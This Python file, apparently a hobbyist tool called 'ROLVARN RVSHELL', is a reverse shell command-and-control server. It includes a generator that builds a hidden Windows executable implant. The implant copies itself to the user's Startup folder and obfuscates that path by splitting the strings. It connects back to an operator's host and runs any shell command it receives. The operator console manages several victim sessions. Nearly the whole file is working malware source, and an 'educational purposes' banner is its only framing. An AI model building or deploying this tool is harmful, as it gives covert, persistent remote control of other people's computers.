import socket
import threading
import os
import subprocess
import tempfile
from colorama import Fore

os.system("title ROLVARN RVSHELL")
os.system("echo off")
os.system("cls")
print(Fore.RED + """
 ██▀███   ▒█████   ██▓  ██▒   █▓ ▄▄▄       ██▀███   ███▄    █ 
▓██ ▒ ██▒▒██▒  ██▒▓██▒ ▓██░   █▒▒████▄    ▓██ ▒ ██▒ ██ ▀█   █ 
▓██ ░▄█ ▒▒██░  ██▒▒██░  ▓██  █▒░▒██  ▀█▄  ▓██ ░▄█ ▒▓██  ▀█ ██▒
▒██▀▀█▄  ▒██   ██░▒██░   ▒██ █░░░██▄▄▄▄██ ▒██▀▀█▄  ▓██▒  ▐▌██▒
░██▓ ▒██▒░ ████▓▒░░██████▒▒▀█░   ▓█   ▓██▒░██▓ ▒██▒▒██░   ▓██░
░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▐░   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒ 
  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░░ ░░    ▒   ▒▒ ░  ░▒ ░ ▒░░ ░░   ░ ▒░
  ░░   ░ ░ ░ ░ ▒    ░ ░     ░░    ░   ▒     ░░   ░    ░   ░ ░ 
   ░         ░ ░      ░  ░   ░        ░  ░   ░              ░ 
                            ░                                 
 ██▀███   ██▒   █▓  ██████  ██░ ██ ▓█████  ██▓     ██▓        
▓██ ▒ ██▒▓██░   █▒▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒        
▓██ ░▄█ ▒ ▓██  █▒░░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░        
▒██▀▀█▄    ▒██ █░░  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░        
░██▓ ▒██▒   ▒▀█░  ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒    
░ ▒▓ ░▒▓░   ░ ▐░  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░    
  ░▒ ░ ▒░   ░ ░░  ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░    
  ░░   ░      ░░  ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░       
   ░           ░        ░   ░  ░  ░   ░  ░    ░  ░    ░  ░    
              ░                                               

Only for educational Purposes                   ~by ROLVARN
===============================================================\n
"""+ Fore.WHITE)

SERVER_IP = input(Fore.LIGHTCYAN_EX + "Enter your IP address (Default 127.0.0.1): ") or "127.0.0.1"
PORT = int(input(Fore.LIGHTCYAN_EX+"Enter Port (Default 6666): "+ Fore.WHITE) or 6666)

clients = {}
active_session = None
template = r"""
import socket
import subprocess
import locale
import threading
import os
import sys
import shutil

SERVER_IP = "{hostname}"
PORT = {portnumber}

destination = os.path.join(os.getenv('AP'+'PD'+'AT'+'A'), 'Mic'+'ro'+'so'+'ft', 'W'+'in'+'d'+'ow'+'s', 'St'+'ar'+'t M'+'en'+'u', 'Pr'+'og'+'ra'+'ms', 'St'+'ar'+'tu'+'p')
if getattr(sys, 'frozen', False):
    source = sys.executable
else:
    source = os.path.abspath(sys.argv[0])
enc = locale.getpreferredencoding()
fn = os.path.basename(source)
dest_file = os.path.join(destination, fn)
try:
    if not os.path.exists(dest_file):
        shutil.copy2(source, dest_file)
        
    else:
        pass
except Exception as e:
    pass

s = socket.socket()
s.connect((SERVER_IP,PORT))

print("[*] Connected to server.")

def run_command(cmd):
    try:
        result = subprocess.check_output(
            cmd, stderr=subprocess.STDOUT, shell=True
        ).decode(enc, errors="ignore")
    except Exception as e:
        result = str(e)
    if not result.strip():
        result = "[#] Executed."
    try:
        s.send(result.encode())
    except:
        pass

while True:
    try:

        encaad = s.recv(1024).decode()
        if encaad.lower().strip() == "q":
            break
        if encaad.startswith("cd "):
            try:
                os.chdir(encaad[3:])
                mycwd = os.getcwd()
                s.send(f"[#] Changed directory to {{mycwd}}".encode())
            except:
                s.send(f"[#] No directory here named {{encaad[3:]}}".encode())
            continue
        
        threading.Thread(target=run_command, args=(encaad,), daemon=True).start()
    except ConnectionResetError:
        break
"""
def make_exe(hostname,portnumber):
    try:
        portnumber_int = int(portnumber)
        code = template.format(hostname=hostname,portnumber=portnumber_int)
        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as tmp:
            tmp.write(code)
            py_path = tmp.name   
        os.makedirs("C:/ROLVARN",exist_ok=True)
        subprocess.run(["pyinstaller","--onefile","--noconsole",py_path])
        print(Fore.GREEN+"Build completed!" + Fore.WHITE)
        os.system("start C:\ROLVARN\dist")
    except Exception as e:
        print(Fore.RED + f"[!] Hata: {e}" + Fore.WHITE)

def handle_client(conn, addr, client_id):
    global active_session
    print(f"[#] Client {client_id} : {addr[0]} Connected")
    
    while True:
        try:
            if active_session == client_id:
                data = conn.recv(4096).decode()
                if not data:
                    break
                print(f"Output:\n{data}\n")
            else:
                pass
        except:
            break
    
    conn.close()
    print(f"[#] Client {client_id} closed.")
    if client_id in clients:
        del clients[client_id]
        if active_session == client_id:
            active_session = None

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((SERVER_IP, PORT))
    server.listen(5)
    print( Fore.GREEN + f"Listening on : {SERVER_IP}:{PORT}" + Fore.WHITE)
    
    client_id = 0
    while True:
        conn, addr = server.accept()
        client_id += 1
        clients[client_id] = (conn, addr)
        threading.Thread(target=handle_client, args=(conn, addr, client_id), daemon=True).start()

def send_to_client(client_id, cmd):
    if client_id in clients:
        conn, addr = clients[client_id]
        try:
            conn.send(cmd.encode())
        except:
            print(f"Client {client_id} can't accept your message.")
    else:
        print(f"No clients in {client_id}")

if __name__ == "__main__":
    threading.Thread(target=start_server, daemon=True).start()

    while True:
        if active_session is not None:
            cmd = input(f"Session [{active_session}] > ")
            if cmd == "bg":
                print(f"Session [{active_session}] went to the background.")
                active_session = None
            elif cmd.lower() == "q":
                send_to_client(active_session, "q")
                if active_session in clients:
                    del clients[active_session]
                active_session = None
            else:
                send_to_client(active_session, cmd)
        else:
            cmd = input(Fore.BLUE+"rolvarn > " + Fore.WHITE)
            if cmd == "sessions":
                if not clients:
                    print("No clients here!")
                else:
                    for cid, (c, addr) in clients.items():
                        print(f"[{cid}] - {addr[0]}")
            elif cmd.startswith("sessions -i"):
                try:
                    cid = int(cmd.split(" ")[2])
                    if cid in clients:
                        active_session = cid
                        print(f"[#] {cid} active.")
                    else:
                        print(f"There is no client in [{cid}]")
                except:
                    print(f"Wrong use. Try: sessions -i <id>")
            elif cmd == "make rvshell":
                
                hostname = input(Fore.LIGHTCYAN_EX + "Enter hostname: "+ Fore.WHITE)
                portnumber = input(Fore.LIGHTCYAN_EX + "Enter port: " + Fore.WHITE)
                threading.Thread(target=make_exe,args=(hostname,portnumber)).start()
                
            
            elif cmd == "exit":
                print(Fore.LIGHTMAGENTA_EX+ "Exiting..."+Fore.WHITE)
                break
